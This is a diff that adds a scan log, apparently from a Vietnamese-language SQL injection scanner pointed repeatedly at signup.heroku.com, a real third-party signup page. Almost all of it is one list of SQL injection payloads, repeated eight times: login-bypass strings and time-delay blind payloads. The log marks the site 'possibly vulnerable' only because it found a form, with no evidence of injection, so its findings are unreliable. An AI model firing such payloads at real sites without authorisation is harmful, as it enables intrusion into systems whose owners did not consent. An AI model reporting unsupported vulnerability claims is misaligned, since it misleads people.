@@ -1,0 +1,247 @@
+[URL] https://signup.heroku.com/account
+Kiểm tra SQL Injection trên: https://signup.heroku.com/account
+[!] URL không chứa tham số để kiểm tra payload.
+[✓] Không thể thực hiện kiểm tra SQLi.
+
+
+====
+[URL] https://signup.heroku.com
+[*] Đang kiểm tra SQL Injection trên: https://signup.heroku.com
+[!] URL không chứa tham số. Đang thử tìm form để kiểm tra...
+[!] Có thể bị tấn công SQLi với các payloads:
+    - ' OR '1'='1
+    - " OR "1"="1
+    - ') OR ('1'='1
+    - " OR 1=1 --
+    - ' OR 1=1#
+    - " OR 1=1#
+    - admin' --
+    - 1' or '1' = '1
+    - ' AND 1=1 --
+    - ' AND 1=2 --
+    - " AND 1=1 --
+    - " AND 1=2 --
+    - ') AND '1'='1
+    - ') AND '1'='2
+    - " OR "" = "
+    - ' OR '' = '
+    - '; WAITFOR DELAY '0:0:5' --
+    - '; SELECT pg_sleep(5)--
+    - " OR SLEEP(5) --
+    - ') OR SLEEP(5) --
+    - " OR 1=1; SLEEP(5) --
+    - admin' OR SLEEP(3)--
+    - 1); SELECT sleep(5);--
+
+
+====
+[URL] https://signup.heroku.com
+[*] Đang kiểm tra SQL Injection trên: https://signup.heroku.com
+[!] URL không chứa tham số. Đang thử tìm form để kiểm tra...
+[!] Có thể bị tấn công SQLi với các payloads:
+    - ' OR '1'='1
+    - " OR "1"="1
+    - ') OR ('1'='1
+    - " OR 1=1 --
+    - ' OR 1=1#
+    - " OR 1=1#
+    - admin' --
+    - 1' or '1' = '1
+    - ' AND 1=1 --
+    - ' AND 1=2 --
+    - " AND 1=1 --
+    - " AND 1=2 --
+    - ') AND '1'='1
+    - ') AND '1'='2
+    - " OR "" = "
+    - ' OR '' = '
+    - '; WAITFOR DELAY '0:0:5' --
+    - '; SELECT pg_sleep(5)--
+    - " OR SLEEP(5) --
+    - ') OR SLEEP(5) --
+    - " OR 1=1; SLEEP(5) --
+    - admin' OR SLEEP(3)--
+    - 1); SELECT sleep(5);--
+
+
+====
+[URL] https://signup.heroku.com
+[*] Đang kiểm tra SQL Injection trên: https://signup.heroku.com
+[!] URL không chứa tham số. Đang thử tìm form để kiểm tra...
+[!] Có thể bị tấn công SQLi với các payloads:
+    - ' OR '1'='1
+    - " OR "1"="1
+    - ') OR ('1'='1
+    - " OR 1=1 --
+    - ' OR 1=1#
+    - " OR 1=1#
+    - admin' --
+    - 1' or '1' = '1
+    - ' AND 1=1 --
+    - ' AND 1=2 --
+    - " AND 1=1 --
+    - " AND 1=2 --
+    - ') AND '1'='1
+    - ') AND '1'='2
+    - " OR "" = "
+    - ' OR '' = '
+    - '; WAITFOR DELAY '0:0:5' --
+    - '; SELECT pg_sleep(5)--
+    - " OR SLEEP(5) --
+    - ') OR SLEEP(5) --
+    - " OR 1=1; SLEEP(5) --
+    - admin' OR SLEEP(3)--
+    - 1); SELECT sleep(5);--
+
+
+====
+[URL] https://signup.heroku.com
+[*] Đang kiểm tra SQL Injection trên: https://signup.heroku.com
+[!] URL không chứa tham số. Đang thử tìm form để kiểm tra...
+[!] Có thể bị tấn công SQLi với các payloads:
+    - ' OR '1'='1
+    - " OR "1"="1
+    - ') OR ('1'='1
+    - " OR 1=1 --
+    - ' OR 1=1#
+    - " OR 1=1#
+    - admin' --
+    - 1' or '1' = '1
+    - ' AND 1=1 --
+    - ' AND 1=2 --
+    - " AND 1=1 --
+    - " AND 1=2 --
+    - ') AND '1'='1
+    - ') AND '1'='2
+    - " OR "" = "
+    - ' OR '' = '
+    - '; WAITFOR DELAY '0:0:5' --
+    - '; SELECT pg_sleep(5)--
+    - " OR SLEEP(5) --
+    - ') OR SLEEP(5) --
+    - " OR 1=1; SLEEP(5) --
+    - admin' OR SLEEP(3)--
+    - 1); SELECT sleep(5);--
+
+
+====
+[URL] https://signup.heroku.com/account
+[*] Đang kiểm tra SQL Injection trên: https://signup.heroku.com/account
+[!] URL không chứa tham số. Đang thử tìm form để kiểm tra...
+[!] Có thể bị tấn công SQLi với các payloads:
+    - ' OR '1'='1
+    - " OR "1"="1
+    - ') OR ('1'='1
+    - " OR 1=1 --
+    - ' OR 1=1#
+    - " OR 1=1#
+    - admin' --
+    - 1' or '1' = '1
+    - ' AND 1=1 --
+    - ' AND 1=2 --
+    - " AND 1=1 --
+    - " AND 1=2 --
+    - ') AND '1'='1
+    - ') AND '1'='2
+    - " OR "" = "
+    - ' OR '' = '
+    - '; WAITFOR DELAY '0:0:5' --
+    - '; SELECT pg_sleep(5)--
+    - " OR SLEEP(5) --
+    - ') OR SLEEP(5) --
+    - " OR 1=1; SLEEP(5) --
+    - admin' OR SLEEP(3)--
+    - 1); SELECT sleep(5);--
+
+
+====
+[URL] https://signup.heroku.com/account
+[*] Đang kiểm tra SQL Injection trên: https://signup.heroku.com/account
+[!] URL không chứa tham số. Đang thử tìm form để kiểm tra...
+[!] Có thể bị tấn công SQLi với các payloads:
+    - ' OR '1'='1
+    - " OR "1"="1
+    - ') OR ('1'='1
+    - " OR 1=1 --
+    - ' OR 1=1#
+    - " OR 1=1#
+    - admin' --
+    - 1' or '1' = '1
+    - ' AND 1=1 --
+    - ' AND 1=2 --
+    - " AND 1=1 --
+    - " AND 1=2 --
+    - ') AND '1'='1
+    - ') AND '1'='2
+    - " OR "" = "
+    - ' OR '' = '
+    - '; WAITFOR DELAY '0:0:5' --
+    - '; SELECT pg_sleep(5)--
+    - " OR SLEEP(5) --
+    - ') OR SLEEP(5) --
+    - " OR 1=1; SLEEP(5) --
+    - admin' OR SLEEP(3)--
+    - 1); SELECT sleep(5);--
+
+
+====
+[URL] https://signup.heroku.com/account
+[*] Đang kiểm tra SQL Injection trên: https://signup.heroku.com/account
+[!] URL không chứa tham số. Đang thử tìm form để kiểm tra...
+[!] Có thể bị tấn công SQLi với các payloads:
+    - ' OR '1'='1
+    - " OR "1"="1
+    - ') OR ('1'='1
+    - " OR 1=1 --
+    - ' OR 1=1#
+    - " OR 1=1#
+    - admin' --
+    - 1' or '1' = '1
+    - ' AND 1=1 --
+    - ' AND 1=2 --
+    - " AND 1=1 --
+    - " AND 1=2 --
+    - ') AND '1'='1
+    - ') AND '1'='2
+    - " OR "" = "
+    - ' OR '' = '
+    - '; WAITFOR DELAY '0:0:5' --
+    - '; SELECT pg_sleep(5)--
+    - " OR SLEEP(5) --
+    - ') OR SLEEP(5) --
+    - " OR 1=1; SLEEP(5) --
+    - admin' OR SLEEP(3)--
+    - 1); SELECT sleep(5);--
+
+
+====
+[URL] https://signup.heroku.com/account
+[*] Đang kiểm tra SQL Injection trên: https://signup.heroku.com/account
+[!] URL không chứa tham số. Đang thử tìm form để kiểm tra...
+[!] Có thể bị tấn công SQLi với các payloads:
+    - ' OR '1'='1
+    - " OR "1"="1
+    - ') OR ('1'='1
+    - " OR 1=1 --
+    - ' OR 1=1#
+    - " OR 1=1#
+    - admin' --
+    - 1' or '1' = '1
+    - ' AND 1=1 --
+    - ' AND 1=2 --
+    - " AND 1=1 --
+    - " AND 1=2 --
+    - ') AND '1'='1
+    - ') AND '1'='2
+    - " OR "" = "
+    - ' OR '' = '
+    - '; WAITFOR DELAY '0:0:5' --
+    - '; SELECT pg_sleep(5)--
+    - " OR SLEEP(5) --
+    - ') OR SLEEP(5) --
+    - " OR 1=1; SLEEP(5) --
+    - admin' OR SLEEP(3)--
+    - 1); SELECT sleep(5);--
+
+
+====
